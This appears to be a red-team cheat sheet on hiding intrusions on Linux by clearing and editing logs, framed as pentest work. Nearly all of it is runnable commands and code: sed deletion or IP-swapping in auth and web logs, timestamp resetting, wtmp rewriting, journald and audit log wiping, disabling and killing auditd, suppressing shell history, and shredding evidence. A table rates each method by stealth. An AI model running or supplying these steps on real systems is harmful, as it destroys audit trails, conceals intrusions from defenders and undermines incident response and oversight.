# Linux Log Clearing & Manipulation

Tag MITRE: T1070.002 (Clear Linux/Mac System Logs), T1070.003 (Clear Command History)

## Key Log Locations

| Log File | Distro | Contents | Format |
|----------|--------|----------|--------|
| `/var/log/auth.log` | Debian/Ubuntu | SSH, sudo, PAM auth | Text |
| `/var/log/secure` | RHEL/CentOS | SSH, sudo, PAM auth | Text |
| `/var/log/syslog` | Debian/Ubuntu | General system messages | Text |
| `/var/log/messages` | RHEL/CentOS | General system messages | Text |
| `/var/log/kern.log` | All | Kernel messages | Text |
| `/var/log/wtmp` | All | Login records (who, last) | Binary (utmp) |
| `/var/log/btmp` | All | Failed login attempts (lastb) | Binary (utmp) |
| `/var/run/utmp` | All | Currently logged-in users (who) | Binary (utmp) |
| `/var/log/lastlog` | All | Last login per user | Binary |
| `/var/log/audit/audit.log` | All (auditd) | Audit framework events | Text (key=value) |
| `/var/log/apache2/access.log` | Debian/Ubuntu | Apache HTTP requests | Text |
| `/var/log/httpd/access_log` | RHEL/CentOS | Apache HTTP requests | Text |
| `/var/log/nginx/access.log` | All | Nginx HTTP requests | Text |
| `/var/log/mysql/error.log` | All | MySQL errors/queries | Text |
| `/var/log/postgresql/` | All | PostgreSQL logs | Text |

## Evidence Capture — Before You Modify Anything

Always capture original state for your pentest report:
```bash
# Record original timestamps and sizes of log files you'll touch
stat /var/log/auth.log /var/log/syslog /var/log/wtmp > /tmp/.log_state_before.txt 2>/dev/null

# Snapshot your own footprint for evidence.json
grep -n "$(whoami)\|$ATTACKER_IP" /var/log/auth.log | \
  jq -Rs '{technique:"T1070.002",target:"linux_logs",entries_found:split("\n")|length,sample:split("\n")[0:5]}' \
  > /tmp/.evidence_log_clear.json
```

## Selective Text Log Editing (Preferred — T1070.002)

> **⚠️ SAFETY: Targeted removal is ALWAYS preferred over full wipe. Empty log files are an instant red flag to defenders and SIEMs.**

### Remove entries by IP or username
```bash
# Remove all lines containing attacker IP
sed -i '/10\.10\.14\.5/d' /var/log/auth.log
sed -i '/10\.10\.14\.5/d' /var/log/syslog

# Remove SSH login events for attacker
sed -i '/Accepted.*10\.10\.14\.5/d' /var/log/auth.log
sed -i '/session opened.*attacker_user/d' /var/log/auth.log

# Remove sudo entries
sed -i '/attacker_user.*COMMAND/d' /var/log/auth.log

# Web server logs — remove attacker requests
sed -i '/10\.10\.14\.5/d' /var/log/apache2/access.log
sed -i '/10\.10\.14\.5/d' /var/log/nginx/access.log
```

### Replace IP with benign IP (highest stealth)
```bash
# Swap attacker IP for localhost — log integrity preserved, entries still exist
sed -i 's/10\.10\.14\.5/127.0.0.1/g' /var/log/auth.log /var/log/syslog
```

### Remove entries in a time window
```bash
sed -i '/^Feb 11 20:3[0-9]/d' /var/log/auth.log
sed -i '/^Feb 11 20:4[0-9]/d' /var/log/auth.log
```

### Preserve timestamps on edited files
```bash
# Note original timestamps BEFORE modifying
ORIG_ATIME=$(stat -c %X /var/log/auth.log)
ORIG_MTIME=$(stat -c %Y /var/log/auth.log)
# ... perform edits ...
touch -a -d @$ORIG_ATIME /var/log/auth.log
touch -m -d @$ORIG_MTIME /var/log/auth.log
```

> **⚠️ SAFETY: Don't forget rotated logs.** `sed` on `auth.log` misses `auth.log.1`, `auth.log.2.gz`, etc.

### Handle rotated/compressed logs
```bash
ls /var/log/auth.log*                              # list all rotated copies
zgrep '10.10.14.5' /var/log/auth.log.*.gz          # check compressed rotated logs

# Edit compressed logs
gunzip /var/log/auth.log.2.gz
sed -i '/10\.10\.14\.5/d' /var/log/auth.log.2
gzip /var/log/auth.log.2
```

## Binary Log Manipulation (utmp/wtmp/btmp)

These are binary files — `sed` won't work. Tools: `utmpdump`, `who`, `last`.

### Selective wtmp editing with utmpdump
```bash
utmpdump /var/log/wtmp > /tmp/.wtmp_dump.txt
grep -c 'attacker_user' /tmp/.wtmp_dump.txt        # count entries to remove
sed -i '/attacker_user/d' /tmp/.wtmp_dump.txt       # remove attacker entries
utmpdump -r /tmp/.wtmp_dump.txt > /var/log/wtmp     # rebuild binary
shred -zun 1 /tmp/.wtmp_dump.txt                    # clean temp file
```

### Python struct approach (surgical single-entry removal)
```python
import struct, os
UTMP_FMT = 'hi32s4s32s256shhiii4i20s'  # Linux utmp record format
RECORD_SIZE = struct.calcsize(UTMP_FMT)  # 384 bytes per record
with open('/var/log/wtmp', 'rb') as f:
    data = f.read()
records = [data[i:i+RECORD_SIZE] for i in range(0, len(data), RECORD_SIZE)]
clean = [r for r in records if b'attacker_user' not in r and b'10.10.14.5' not in r]
with open('/var/log/wtmp', 'wb') as f:
    f.write(b''.join(clean))
print(f"Removed {len(records) - len(clean)} records")
```

### Full wipe (loud — use only when necessary)
```bash
> /var/log/wtmp
> /var/log/btmp
> /var/run/utmp
> /var/log/lastlog
```

> **⚠️ SAFETY: Wiping wtmp means `last` returns nothing — immediately suspicious.**

## Systemd Journald

Journal files: `/var/log/journal/` (persistent) or `/run/log/journal/` (volatile).

```bash
# Vacuum to minimal size
journalctl --vacuum-time=1s
journalctl --vacuum-size=1K
journalctl --vacuum-files=1

# Rotate then vacuum (forces current journal closed first)
journalctl --rotate && journalctl --vacuum-time=1s

# Direct removal
rm -rf /var/log/journal/* /run/log/journal/*
systemctl restart systemd-journald

# Check if journal is persistent or volatile
ls -la /var/log/journal/ 2>/dev/null && echo "PERSISTENT" || echo "VOLATILE (ram only)"
```

> **⚠️ SAFETY: If `Storage=persistent` in `/etc/systemd/journald.conf`, journals survive reboot. Check before assuming volatile.**

## Auditd (Linux Audit Framework) — T1070.002

```bash
# Check if auditd is active
systemctl is-active auditd

# Disable auditing at kernel level (immediate — no restart)
auditctl -e 0

# Delete all audit rules
auditctl -D

# Clear the audit log
> /var/log/audit/audit.log

# Selective removal — remove entries matching your PID or addr
sed -i '/pid=31337/d' /var/log/audit/audit.log
sed -i '/addr=10\.10\.14\.5/d' /var/log/audit/audit.log

# Suppress specific syscall auditing
auditctl -a never,exit -F arch=b64 -S execve    # stop logging execve
auditctl -a never,task                           # stop logging all new tasks

# Stop auditd (note: auditd resists systemctl stop on some distros)
service auditd stop                              # sysvinit method (more reliable)
kill -9 $(pidof auditd)                          # last resort
```

## Shell History — T1070.003

```bash
# === PREVENTION (run BEFORE doing anything) ===
unset HISTFILE                                    # don't write to history file
export HISTFILE=/dev/null                         # redirect to null
export HISTSIZE=0                                 # zero in-memory history
set +o history                                    # bash: disable history engine entirely

# Zsh equivalent
fc -p /dev/null                                   # redirect zsh history to /dev/null
unset SAVEHIST

# === CLEANUP (run AFTER operations) ===
history -c && history -w                          # clear memory + flush empty to file

# Delete history files
rm -f ~/.bash_history ~/.zsh_history ~/.python_history ~/.sh_history
rm -f ~/.local/share/fish/fish_history
rm -f ~/.mysql_history ~/.psql_history ~/.rediscli_history

# Secure delete (anti-forensics)
shred -zun 3 ~/.bash_history 2>/dev/null

# PowerShell on Linux
rm -f ~/.local/share/powershell/PSReadLine/ConsoleHost_history.txt
```

> **⚠️ SAFETY: `unset HISTFILE` only affects the current shell. Other shells/sessions still log. Run in every shell you open.**

## Kernel Ring Buffer

```bash
dmesg -C                     # clear kernel ring buffer (requires root)
dmesg -c > /dev/null          # read and clear (suppresses output)
```

## Application-Specific Logs

```bash
# Apache
sed -i '/10\.10\.14\.5/d' /var/log/apache2/access.log /var/log/apache2/error.log
kill -USR1 $(cat /var/run/apache2.pid 2>/dev/null)   # force log rotation

# Nginx
sed -i '/10\.10\.14\.5/d' /var/log/nginx/access.log /var/log/nginx/error.log
kill -USR1 $(cat /var/run/nginx.pid 2>/dev/null)     # reopen log files

# MySQL — general query log (if enabled)
> /var/log/mysql/mysql.log
> /var/log/mysql/error.log

# PostgreSQL
> /var/log/postgresql/postgresql-*-main.log

# Cron
sed -i '/attacker_user/d' /var/log/cron /var/log/cron.log 2>/dev/null
```

## Remote Syslog Check

> **⚠️ CRITICAL: If logs are forwarded to a remote syslog/SIEM, local clearing is USELESS. Check first.**

```bash
# Check for remote forwarding rules
grep -rE '^\s*[^#].*@@?' /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null
grep -i 'destination' /etc/syslog-ng/syslog-ng.conf 2>/dev/null
ss -tlnp | grep 514       # is a syslog daemon listening/forwarding?
```

## Anti-Forensics — Secure Deletion

```bash
# Overwrite then delete (3 random passes + 1 zero pass)
shred -vfzun 3 /var/log/auth.log

# Wipe free space (covers deleted file remnants on partition)
dd if=/dev/urandom of=/var/log/.wipe bs=1M 2>/dev/null; rm -f /var/log/.wipe
```

> **⚠️ SAFETY: `shred` is unreliable on ext4 (journaling) and SSDs (wear leveling/TRIM). On SSDs, deleted data may persist in spare blocks regardless.**

## Evidence Capture — After Clearing

```bash
# Record what was cleaned for your pentest report
cat > /tmp/.evidence_log_clear.json << 'EOF'
{
  "technique": "T1070.002",
  "technique_name": "Clear Linux/Mac System Logs",
  "target_host": "TARGET_HOSTNAME",
  "timestamp": "TIMESTAMP_UTC",
  "logs_modified": [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/wtmp"
  ],
  "method": "selective_sed_removal",
  "pattern_removed": "10.10.14.5",
  "rotated_logs_checked": true,
  "remote_syslog_present": false,
  "notes": "Removed N entries matching attacker IP from auth.log and syslog. Rotated logs also cleaned."
}
EOF
```

## Quick Decision Matrix

| Approach | Stealth | Risk | When to Use |
|----------|---------|------|-------------|
| `sed` remove specific lines | ★★★★ | Log gaps at specific times | Preferred — surgical removal |
| Replace IP with benign IP | ★★★★★ | Must be consistent everywhere | Best stealth when feasible |
| Truncate (`> logfile`) | ★★ | Empty file = obvious red flag | Only when time-critical |
| `shred` + delete | ★ | Missing file = even worse | Anti-forensics only |
| Disable logging first | ★★★★ | Logging gap visible in timeline | Best when pre-planned |
